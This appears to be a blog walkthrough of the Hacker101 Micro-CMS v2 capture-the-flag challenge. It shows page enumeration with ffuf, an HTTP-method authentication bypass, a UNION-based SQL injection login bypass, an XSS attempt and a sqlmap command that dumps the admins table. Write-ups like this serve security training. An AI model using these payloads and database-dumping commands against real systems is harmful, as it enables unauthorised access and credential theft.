---
title: "[Hacker101 CTF ] Micro-CMS v2 walkthrough"
datePublished: Sun Jul 02 2023 11:42:41 GMT+0000 (Coordinated Universal Time)
cuid: cljld4ugk000109l27h2l7gu5
slug: hacker101-ctf-micro-cms-v2-walkthrough
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1688298084586/abe6a2cf-89d9-4b24-b376-3c3487ecfe2f.png
tags: ctf, walkthrough, ctf-writeup

---

## introduction

* This is a continuation of the previous Micro-CMS v1 challenge from [Hacker101 CTF](https://ctf.hacker101.com/), so I recommend giving it a shot and [reading the previous walkthrough](https://scriptmaker.hashnode.dev/hacker101-ctf) before proceeding with this one.
    
* **This is a challenge containing three flags to teach you some common web vulnerabilities.**
    
* Challenge difficulty: **Moderate**
    

## **Recon( Information Gathering)**

in this stage, you would like to use some tools like [**Nmap**](https://nmap.org/), [**Shodan**](https://www.shodan.io/) and [**Metasploit**](https://www.metasploit.com/)**, etc**.

When I jump into a challenge I like to start by manually investigating what is possible within the constraints of the user interface. In this case, the challenge is a simple CMS with the following features:

1. Micro-CMS Changelog
    
2. Edit page
    
3. Create page
    
4. Login
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1688294370240/7df586a6-078f-4f82-9a85-72dda557755d.png align="left")

It seems like the developers have fixed every vulnerability from the previous challenge! I hope not, but let’s see what we can do. In the previous challenge, we had a hidden page but we don’t know if that’s still the case, so let’s enumerate page IDs again.

```bash
# Create a file called range.txt with numbers from 1 to 50
$ seq 50 > range.txt

# Use the ffuf tool to perform a web application brute-force attack by replacing the keyword "FUZZ" in the URL with each value in the range.txt file
# The -w flag specifies the wordlist to use (in this case, range.txt)
# The -u flag specifies the target URL with the keyword "FUZZ" indicating where the values from the wordlist will be inserted
$ ffuf -w range.txt -u https://<subdomain>.ctf.hacker101.com/page/FUZZ
...
2      [Status: 200, Size: 433, Words: 19, Lines: 16]
1      [Status: 200, Size: 538, Words: 63, Lines: 15]
3      [Status: 403, Size: 234, Words: 27, Lines: 5]
```

We have a page with ID 3 that we have never seen before, but this time trying to access `/page/edit/3` fails since it’s behind authentication. A common mistake by developers is only protecting pages that the client can see (GET requests), but nothing prevents users from sending other [HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) to the server.

---

### Flag 0

So a GET to `/page/edit/3` yields a `403`, does POST or PUT yield the same HTTP response code?

```bash
# Send a PUT request to the specified URL with ID 3
$ curl -X PUT "https://<subdomain>.ctf.hacker101.com/page/edit/3"

# The server responds with an HTML page containing a 405 Method Not Allowed error,
# indicating that the PUT request method is not allowed for this URL

# Send a POST request to the specified URL with ID 3
$ curl -X POST "https://<subdomain>.ctf.hacker101.com/page/edit/3"

# The server responds with a flag, which is indicated by the "^FLAG^" and "$FLAG$" markers.
```

---

### Flag 1

I feel it’s time to start playing with the new login feature and see if we can get access to these pages.

Going to the `/login` path and sending a single quote (`'`) as the username yields the server error that we can see below:

```haskell
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

Errors that yield the stack trace are super valuable since it gives us more ideas of what can be exploited. In this case, we can see that the server is using MariaDB and that the error is related to the SQL syntax. We can also see that the query is being built using string interpolation without any escaping or parameterized queries. This means that we can inject SQL code into the query and get the server to execute it.

Sending the username as `'abc' OR 1=1;--` bypasses this username check, but still doesn’t allow us to log in with the message: `Invalid password`. If the username that we used confuses you I recommend going over [this material](https://portswigger.net/web-security/sql-injection) from PortSwigger Academy.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1688296304288/10939e18-aabd-4abd-81a0-e29cdd42c26b.png align="left")

We could go and use something like [sqlmap](https://sqlmap.org/) to automate the SQLi exploitation and dump the entire database, but let’s see how the SQL query is built and try to bypass it manually.

```sql
SELECT password FROM admins 
WHERE username=\'%s\'' % request.form['username'];
```

Thus, I will be able to input the value “abc” for the password and when the SELECT statement is executed, a column “password” will be created and filled with the static value “abc”, where the web application will retrieve the value from the column “password” and compared to the inputted value.

Hence, the result will be true, allowing me to bypass the authentication with any username and the password to be “abc”.  
Here the full SQL injection statement should be.

```sql
-- The injected code uses the UNION operator to combine the original query with another query that selects a hardcoded value ("abc") as the 'password' column,
-- which is then returned as part of the original query result
-- The WHERE clause is modified to always evaluate to true ('1'='1'), which allows the injected query to be executed alongside the original query
admin' UNION SELECT "abc" AS password FROM admins WHERE '1'='1
```

to be clear the whole SQL code must be like this but we modify it for the injection in the username field

```sql
SELECT password FROM admins WHERE username='admin'
UNION SELECT "abc" AS password FROM admins WHERE '1'='1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1688297127249/e5b37a93-1c1e-4e5c-857d-bdfb06ac3e02.png align="left")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1688297143675/1475a284-da6c-4921-82a9-5c1f3919a34e.png align="left")

Head to the private page

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1688297181909/26463024-d432-4d78-9635-50b4e14fd3cc.png align="left")

Found the Flag! One more to go

---

### Flag 2

Now that we have edit powers I tried to cause an XSS in the button within the Markdown Test page, as we did on the previous challenge. To do that you just need to edit that page and add an attribute `onclick="alert(1)"` and save the page. I played a bunch with it thinking that an admin would see that page and we would be able to get their cookie through XSS, but that was a dead end.  
Eventually, I remembered the HTML comment on the private page from Flag 1.

```haskell
<!-- You got logged in, congrats!  Do you have the real username and password? If not, might want to do that! -->
```

This prompted me to dump the database using sqlmap since I have no idea what the existing username is. Here’s what I did:

```bash
# Use the sqlmap tool to perform a SQL injection attack on the login form of a web application
# The -u flag specifies the target URL (in this case, the login page of the web application)
# The --data flag specifies the POST data to send to the server (in this case, the username and password values)
# The -p flag specifies which parameter to test for SQL injection (in this case, the 'username' parameter)
# The --dbms flag specifies the type of database management system used by the web application (in this case, MySQL)
# The --dump flag tells sqlmap to dump the contents of any databases it is able to access
$ sqlmap -u https://<subdomain>.ctf.hacker101.com/login --data "username=abc&password=xyz" -p username --dbms=mysql --dump
```

We end up being able to read the admins table:

```sql
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | terrie   | joeann   |
+----+----------+----------+
```

And after logging in with these credentials we get our last flag!

Important note: what is sqlmap didn't work for me, you can go to the [Burpsuit](https://portswigger.net/burp) and brute-force the attack using the payload in the intruder tab.

---

## Conclusion

This was an interesting challenge. The lack of auth for the `POST /page/edit/<ID>` endpoint is realistic and easily missed if you are not using a framework that makes new endpoints secure by default. SQLi is a common theme in CTFs, but always a fun thing to exploit.

> ***Happy Hacking  
> See you next post 👋***